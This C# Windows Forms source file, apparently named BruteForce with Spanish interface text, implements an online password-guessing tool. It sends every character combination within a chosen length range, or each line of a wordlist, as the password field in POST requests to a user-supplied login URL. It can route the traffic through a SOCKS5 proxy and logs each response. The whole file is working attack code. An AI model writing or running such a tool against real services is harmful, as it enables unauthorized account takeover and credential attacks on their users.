using MihaZupan;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Net.Http;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace BruteForce
{
    public partial class Form1 : Form
    {
        public delegate void AddRowToDataGridDelegate(HttpResponseMessage r, string content, string parametros);
        public delegate void ButtonsEnabledDelegate();
        public delegate void ButtonSaveEnabledDelegate();
        public string FilePasswords { get; set; }
        public string Uri { get; set; }
        public string ParamName { get; set; }
        public string ParamValue { get; set; }
        public string KeyName { get; set; }
        public bool IsJson { get; set; }
        public string ProxyIP { get; set; }
        public string ProxyPORT { get; set; }

        private Thread thread;

        private char[] ar = {'a', 'b','c','d','e','f','g','h','j','k','l','m','n','ñ','o','p','q','r','s','t','u','v','w','x','y','z',
            'A','B','C','D','E','F','G','H','I','J','K','L','M','N','Ñ','O','P','Q','R','S','T','U','V','W','X','Y','Z',
            '1','2','3','4','5','6','7','8','9','0','=','/','¿','?',',','.',':',';','+','-','*','Ç','ç','!','¡','-','_','%','&','(',')',
            '$','€','@','"','\'','\\','|','º','ª','¬','{','}','<','>'};

        public Form1()
        {
            InitializeComponent();
        }

        private void BtnAttack_Click(object sender, EventArgs e)
        {
            SetParameters();

            if (comboBox1.SelectedIndex == 0)
            {
                var nMin = this.Controls["nMin"] as NumericUpDown;
                var nMax = this.Controls["nMax"] as NumericUpDown;

                if (nMin != null && nMax != null)
                {
                    ButtonsEnabled();
                    thread = new Thread(() =>
                        PasswordsGeneratedByRange(int.Parse(nMin.Value.ToString()), int.Parse(nMax.Value.ToString()), this));
                    thread.Start();
                }
            }
            else if(comboBox1.SelectedIndex == 1)
            {
                ButtonsEnabled();
                thread = new Thread(() => PasswordsGeneratedByFile());
                thread.Start();
            }
            else
            {
                MessageBox.Show("Selecciona un generador de contraseñas");
            }
        }

        private void PasswordsGeneratedByFile()
        {
            if (File.Exists(FilePasswords))
            {
                string[] lines = File.ReadAllLines(FilePasswords);
                foreach (var line in lines)
                {
                    SendRequest(line, this);
                }
            }
        }

        private void PasswordsGeneratedByRange(int nMin, int nMax, Form1 form)
        {
            for (int i = nMin; i <= nMax; i++)
            {
                char[] pass = new char[i];
                Recursion(ref pass, 0, i, form);
            }

            ButtonsEnabledDelegate buttonsEnabledDelegate = new ButtonsEnabledDelegate(ButtonsEnabled);
            ButtonSaveEnabledDelegate buttonSaveEnabledDelegate = new ButtonSaveEnabledDelegate(ButtonSaveEnabled);
            form.Invoke(buttonsEnabledDelegate);
            form.Invoke(buttonSaveEnabledDelegate);
        }

        private void Recursion(ref char[] pass, int index, int maxLength, Form1 form)
        {
            for (int i = 0; i < ar.Length; i++)
            {
                pass[index] = ar[i];

                if (index < maxLength - 1)
                {
                    Recursion(ref pass, index + 1, maxLength, form);
                }
                else
                {
                    SendRequest(String.Concat(pass), form);
                }
            }
        }

        private void SendRequest(string s, Form1 form)
        {
            HttpClient client = null;
            var handler = GetHandler();

            if (handler != null)
            {
                client = new HttpClient(handler: handler, disposeHandler: true);
            }
            else
            {
                client = new HttpClient();
            }

            var json = "{ \"" + ParamName + "\" : \"" + ParamValue + "\",  " +
                " \"" + KeyName + "\" : \"" + s + "\"}";

            if (IsJson)
            {
                var content = new StringContent(json, Encoding.UTF8, "application/json");
                var r = client.PostAsync(Uri, content).Result;
                var c = r.Content.ReadAsStringAsync().Result;
                
                AddRowToDataGridDelegate addRowToDataGrid = new AddRowToDataGridDelegate(AddRowToDataGridMethod);
                form.Invoke(addRowToDataGrid, new Object[] { r, c, json });
            }
            else
            {
                var content = new FormUrlEncodedContent(new[]
                {
                                new KeyValuePair<string, string>(ParamName, ParamValue),
                                new KeyValuePair<string, string>(KeyName, s),
                            });

                var r = client.PostAsync(Uri, content).Result;
                var c = r.Content.ReadAsStringAsync().Result;
                
                AddRowToDataGridDelegate addRowToDataGrid = new AddRowToDataGridDelegate(AddRowToDataGridMethod);
                form.Invoke(addRowToDataGrid, new Object[] { r, c, json });
            }
        }

        public void AddRowToDataGridMethod(HttpResponseMessage r, string content, string parametros)
        {
          dataGridView.Rows.Add(r.StatusCode.ToString(), r.Headers, content, parametros);
        }

        private HttpClientHandler GetHandler()
        {
            try
            {
                if(ProxyIP.Length > 0 && ProxyPORT.Length > 0)
                {
                    var proxy = new HttpToSocks5Proxy(ProxyIP, Int16.Parse(ProxyPORT));
                    var handler = new HttpClientHandler { Proxy = proxy };
                    return handler;
                }
                else
                {
                    throw new Exception();
                }
                
            }
            catch (Exception)
            {
                return null;
            }
        }

        private void SaveDataGridData()
        {
            using (StreamWriter file = new StreamWriter(@".\\prueba.txt"))
            {
                for (int row = 0; row < dataGridView.Rows.Count; row++)
                {
                    for (int col = 0; col < dataGridView.Rows[row].Cells.Count; col++)
                    {
                        if(dataGridView.Rows[row].Cells[col].Value != null)
                        {
                            string value = dataGridView.Rows[row].Cells[col].Value.ToString();
                            file.WriteLine(value);
                        }
                    }
                }
            }
        }

        private void BtnSelectFile_Click(object sender, EventArgs e)
        {
            var result = openFileDialog.ShowDialog();
            if (result == DialogResult.OK)
            {
                FilePasswords = openFileDialog.FileName;
                var txtFileName = this.Controls["txtFileName"] as Label;
                if(txtFileName != null) txtFileName.Text = FilePasswords;
            }
        }
        private void SetParameters()
        {
            if(this.txtUrl.Text.Equals("") || this.txtParamName.Text.Equals("") || this.txtParamValue.Text.Equals("") || this.txtKeyName.Text.Equals(""))
            {
                MessageBox.Show("Rellena bien los campos");
            }
            else
            {
                Uri = this.txtUrl.Text;
                ParamName = this.txtParamName.Text;
                ParamValue = this.txtParamValue.Text;
                KeyName = this.txtKeyName.Text;
                IsJson = this.checkIsJson.Checked;
                ProxyIP = this.txtProxyIp.Text;
                ProxyPORT = this.txtProxyPort.Text;
            }
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            dataGridView.RowHeadersWidthSizeMode = DataGridViewRowHeadersWidthSizeMode.DisableResizing;
        }
        private void ComboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            Console.WriteLine(comboBox1.SelectedIndex);
            Console.WriteLine(comboBox1.SelectedItem);
            if(comboBox1.SelectedIndex == 0)
            {
                PrintCheckBox0();
            }
            else if(comboBox1.SelectedIndex == 1)
            {
                PrintCheckBox1();
            }
        }
        private void PrintCheckBox0()
        {
            this.Controls.RemoveByKey("btnSelectFile");
            this.Controls.RemoveByKey("txtFileName");

            Label label8 = new Label();
            Label label9 = new Label();
            Label label10 = new Label();

            // 
            // label8
            // 
            label8.AutoSize = true;
            label8.Location = new Point(450, 600);
            label8.Name = "label8";
            label8.Size = new Size(34, 17);
            label8.TabIndex = 48;
            label8.Text = "Min:";
            // 
            // label9
            // 
            label9.AutoSize = true;
            label9.Location = new Point(450, 650);
            label9.Name = "label9";
            label9.Size = new Size(37, 17);
            label9.TabIndex = 47;
            label9.Text = "Max:";
            // 
            // label10
            // 
            label10.AutoSize = true;
            label10.Location = new Point(450, 550);
            label10.Name = "label10";
            label10.Size = new Size(141, 17);
            label10.TabIndex = 46;
            label10.Text = "Rango de carácteres";
            
            NumericUpDown nMin = new NumericUpDown();
            NumericUpDown nMax = new NumericUpDown();

            ((System.ComponentModel.ISupportInitialize)(nMin)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(nMax)).BeginInit();
            // 
            // nMin
            // 
            nMin.Location = new Point(550, 600);
            nMin.Minimum = new decimal(new int[] {
                    1,
                    0,
                    0,
                    0});
            nMin.Name = "nMin";
            nMin.Size = new Size(120, 22);
            nMin.TabIndex = 45;
            nMin.Value = new decimal(new int[] {
                    1,
                    0,
                    0,
                    0});
            // 
            // nMax
            // 
            nMax.Location = new Point(550, 650);
            nMax.Minimum = new decimal(new int[] {
                    1,
                    0,
                    0,
                    0});
            nMax.Name = "nMax";
            nMax.Size = new Size(120, 22);
            nMax.TabIndex = 44;
            nMax.Value = new decimal(new int[] {
                    1,
                    0,
                    0,
                    0});

            this.Controls.Add(label8);
            this.Controls.Add(label9);
            this.Controls.Add(label10);
            this.Controls.Add(nMin);
            this.Controls.Add(nMax);

            ((System.ComponentModel.ISupportInitialize)(nMin)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(nMax)).EndInit();

        }
        private void PrintCheckBox1()
        {
            this.Controls.RemoveByKey("label8");
            this.Controls.RemoveByKey("label9");
            this.Controls.RemoveByKey("label10");
            this.Controls.RemoveByKey("nMin");
            this.Controls.RemoveByKey("nMax");

            Button btnSelectFile = new Button();
            Label txtFileName = new Label();
            // 
            // btnSelectFile
            // 
            btnSelectFile.Location = new Point(500, 500);
            btnSelectFile.Name = "btnSelectFile";
            btnSelectFile.Size = new Size(126, 37);
            btnSelectFile.TabIndex = 26;
            btnSelectFile.Text = "Select file";
            btnSelectFile.UseVisualStyleBackColor = true;
            btnSelectFile.Click += new EventHandler(this.BtnSelectFile_Click);
            // 
            // txtFileName
            // 
            txtFileName.Anchor = ((AnchorStyles)((AnchorStyles.Top | AnchorStyles.Right)));
            txtFileName.BorderStyle = BorderStyle.FixedSingle;
            txtFileName.FlatStyle = FlatStyle.Flat;
            txtFileName.Location = new Point(400, 550);
            txtFileName.Name = "txtFileName";
            txtFileName.Size = new Size(318, 37);
            txtFileName.TabIndex = 27;
            txtFileName.Text = "No se ha seleccionado ningún archivo";
            txtFileName.TextAlign = ContentAlignment.MiddleCenter;

            this.Controls.Add(btnSelectFile);
            this.Controls.Add(txtFileName);
        }

        private void btnStop_Click(object sender, EventArgs e)
        {
            if(thread != null)
            {
                if (thread.IsAlive)
                {
                    ButtonsEnabled();
                    thread.Abort();
                }
            }
        }

        private void ButtonsEnabled()
        {
            btnStop.Enabled = !btnStop.Enabled;
            btnAttack.Enabled = !btnAttack.Enabled;
        }

        private void ButtonSaveEnabled()
        {
            btnSave.Enabled = !btnSave.Enabled;
        }

        private void btnSave_Click(object sender, EventArgs e)
        {
            SaveDataGridData();
            ButtonSaveEnabled();
        }
    }
}
